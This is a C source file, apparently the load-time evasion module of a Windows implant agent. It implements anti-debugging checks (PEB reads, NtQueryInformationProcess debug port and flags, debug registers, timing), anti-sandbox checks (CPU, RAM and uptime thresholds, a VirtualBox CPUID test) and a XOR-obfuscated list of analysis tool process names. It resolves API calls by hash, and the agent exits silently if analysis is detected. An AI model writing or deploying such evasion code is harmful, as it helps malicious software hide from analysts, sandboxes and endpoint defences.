/*
 * evasion_loadtime.c — Load-time evasion: anti-debug, anti-sandbox, string encryption.
 *
 * These checks run BEFORE agent_init. If they fail, the agent exits silently.
 */
#include "agent.h"
#include "evasion.h"
#include "api_resolve.h"

/* ─── String encryption helpers ─── */

void xor_decrypt(char *out, const unsigned char *data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++)
        out[i] = (char)(data[i] ^ key);
    out[len] = '\0';
}

void xor_decrypt_w(wchar_t *out, const unsigned char *data, DWORD len, BYTE key) {
    /* data is XOR'd byte-by-byte over the raw wchar_t bytes */
    unsigned char *raw = (unsigned char *)out;
    for (DWORD i = 0; i < len; i++)
        raw[i] = data[i] ^ key;
    /* null-terminate */
    out[len / sizeof(wchar_t)] = L'\0';
}


/* ─── Anti-Debug ─── */

BOOL check_debugger_present(void) {
    /* Method 1: IsDebuggerPresent API */
    if (IsDebuggerPresent())
        return FALSE;

    /* Method 2: Check PEB->BeingDebugged directly (bypass API hooks) */
    {
        void *peb_raw;
#if defined(_M_X64) || defined(__x86_64__)
        __asm__ __volatile__("mov %%gs:0x60, %0" : "=r"(peb_raw));
#else
        __asm__ __volatile__("mov %%fs:0x30, %0" : "=r"(peb_raw));
#endif
        /* PEB->BeingDebugged is at offset 0x02 (UCHAR) */
        if (peb_raw && *((unsigned char *)peb_raw + 0x02))
            return FALSE;
    }

    return TRUE;  /* No debugger detected */
}

BOOL check_remote_debugger(void) {
    /*
     * NtQueryInformationProcess with ProcessDebugPort (0x07).
     * If DebugPort != 0, a debugger is attached.
     * Resolved via PEB walk — no plaintext API strings.
     */
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);

    #define HASH_NtQueryInformationProcess_LT 0x8CDEF1A0
    pNtQueryInformationProcess NtQIP =
        (pNtQueryInformationProcess)api_resolve(HASH_NTDLL, HASH_NtQueryInformationProcess_LT);
    if (!NtQIP) return TRUE;

    DWORD_PTR debugPort = 0;
    NTSTATUS status = NtQIP(GetCurrentProcess(), 7 /* ProcessDebugPort */,
                            &debugPort, sizeof(debugPort), NULL);
    if (NT_SUCCESS(status) && debugPort != 0)
        return FALSE;

    /* ProcessDebugFlags (0x1F): returns 0 if debugged */
    DWORD debugFlags = 1;
    status = NtQIP(GetCurrentProcess(), 0x1F,
                   &debugFlags, sizeof(debugFlags), NULL);
    if (NT_SUCCESS(status) && debugFlags == 0)
        return FALSE;

    return TRUE;
}

BOOL check_hardware_breakpoints(void) {
    /* Check debug registers DR0-DR3 via GetThreadContext */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)
            return FALSE;  /* Hardware breakpoints set */
    }
    return TRUE;
}

BOOL check_timing(void) {
    /*
     * RDTSC timing check: measure time for a simple loop.
     * In a debugger, single-stepping inflates the cycle count dramatically.
     */
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    /* Burn ~1ms of CPU */
    volatile int dummy = 0;
    for (int i = 0; i < 100000; i++)
        dummy += i;

    QueryPerformanceCounter(&end);

    double elapsed_ms = (double)(end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;

    /* If this trivial loop took >500ms, we're being single-stepped */
    if (elapsed_ms > 500.0)
        return FALSE;

    return TRUE;
}


/* ─── Anti-Sandbox ─── */

BOOL check_sandbox_resources(void) {
    /* CPU count: most sandboxes have 1-2 CPUs */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return FALSE;

    /* RAM: sandboxes typically have <4GB */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (ULONGLONG)4 * 1024 * 1024 * 1024)
        return FALSE;

    /* Uptime: if system just booted (<10min), likely a sandbox */
    ULONGLONG uptime_ms = GetTickCount64();
    if (uptime_ms < 10ULL * 60 * 1000)
        return FALSE;

    return TRUE;
}

BOOL check_sandbox_artifacts(void) {
    /*
     * Check for known sandbox/analysis tool processes.
     * All process names XOR-encrypted with inline key to avoid static signatures.
     * Each name decrypted one-at-a-time on the stack, compared, then wiped.
     */
    #define _SBK 0x5A

    /* XOR-encrypted process name entries: {encrypted bytes, length} */
    static const unsigned char _sb0[]  = {'w'^_SBK,'i'^_SBK,'r'^_SBK,'e'^_SBK,'s'^_SBK,'h'^_SBK,'a'^_SBK,'r'^_SBK,'k'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb1[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'m'^_SBK,'o'^_SBK,'n'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb2[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'m'^_SBK,'o'^_SBK,'n'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb3[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'e'^_SBK,'x'^_SBK,'p'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb4[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'e'^_SBK,'x'^_SBK,'p'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb5[]  = {'x'^_SBK,'6'^_SBK,'4'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb6[]  = {'x'^_SBK,'3'^_SBK,'2'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb7[]  = {'o'^_SBK,'l'^_SBK,'l'^_SBK,'y'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb8[]  = {'i'^_SBK,'d'^_SBK,'a'^_SBK,'q'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb9[]  = {'i'^_SBK,'d'^_SBK,'a'^_SBK,'q'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb10[] = {'f'^_SBK,'a'^_SBK,'k'^_SBK,'e'^_SBK,'n'^_SBK,'e'^_SBK,'t'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb11[] = {'d'^_SBK,'u'^_SBK,'m'^_SBK,'p'^_SBK,'c'^_SBK,'a'^_SBK,'p'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
    static const unsigned char _sb12[] = {'h'^_SBK,'t'^_SBK,'t'^_SBK,'p'^_SBK,'d'^_SBK,'e'^_SBK,'b'^_SBK,'u'^_SBK,'g'^_SBK,'g'^_SBK,'e'^_SBK,'r'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};

    static const struct { const unsigned char *enc; int len; } sandbox_procs[] = {
        {_sb0,  sizeof(_sb0)},  {_sb1,  sizeof(_sb1)},  {_sb2,  sizeof(_sb2)},
        {_sb3,  sizeof(_sb3)},  {_sb4,  sizeof(_sb4)},  {_sb5,  sizeof(_sb5)},
        {_sb6,  sizeof(_sb6)},  {_sb7,  sizeof(_sb7)},  {_sb8,  sizeof(_sb8)},
        {_sb9,  sizeof(_sb9)},  {_sb10, sizeof(_sb10)}, {_sb11, sizeof(_sb11)},
        {_sb12, sizeof(_sb12)}, {NULL, 0}
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return TRUE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    BOOL found = FALSE;
    char dec[20];

    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; sandbox_procs[i].enc; i++) {
                int slen = sandbox_procs[i].len;
                for (int j = 0; j < slen; j++)
                    dec[j] = sandbox_procs[i].enc[j] ^ _SBK;
                dec[slen] = '\0';
                if (_stricmp(pe.szExeFile, dec) == 0) {
                    found = TRUE;
                    break;
                }
            }
            SecureZeroMemory(dec, sizeof(dec));
            if (found) break;
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return !found;
}

BOOL check_vm_hypervisor(void) {
    /*
     * CPUID leaf 1, ECX bit 31 = hypervisor present.
     * If set, check leaf 0x40000000 for vendor string.
     * We don't always block VMs (many targets ARE VMs),
     * but we flag known analysis hypervisors.
     *
     * Known analysis vendors:
     *   "Microsoft Hv" — Hyper-V (could be legit, skip)
     *   "VMwareVMware" — VMware (could be legit, skip)
     *   "KVMKVMKVM\0\0\0" — KVM (likely legit, skip)
     *   "VBoxVBoxVBox" — VirtualBox (often sandbox)
     *
     * For now: only flag VirtualBox by default.
     * This is configurable — in a real engagement, many targets run on VMware/Hyper-V.
     */
#if defined(__GNUC__) && (defined(__x86_64__) || defined(__i386__))
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__("cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(1));

    if (!(ecx & (1U << 31)))
        return TRUE;  /* No hypervisor — bare metal */

    /* Read hypervisor vendor string */
    __asm__ __volatile__("cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000));

    char vendor[13] = {0};
    *(unsigned int *)(vendor + 0) = ebx;
    *(unsigned int *)(vendor + 4) = ecx;
    *(unsigned int *)(vendor + 8) = edx;

    /* Only block VirtualBox (common sandbox) */
    if (memcmp(vendor, "VBoxVBoxVBox", 12) == 0)
        return FALSE;
#endif

    return TRUE;
}


/* ─── Master load-time check ─── */

BOOL anti_analysis_check(void) {
#if CONFIG_ANTI_DEBUG
    if (!check_debugger_present())  return FALSE;
    if (!check_remote_debugger())   return FALSE;
    if (!check_hardware_breakpoints()) return FALSE;
    if (!check_timing())            return FALSE;
#endif

#if CONFIG_ANTI_SANDBOX
    if (!check_sandbox_resources()) return FALSE;
    if (!check_sandbox_artifacts()) return FALSE;
    if (!check_vm_hypervisor())     return FALSE;
#endif

    return TRUE;
}
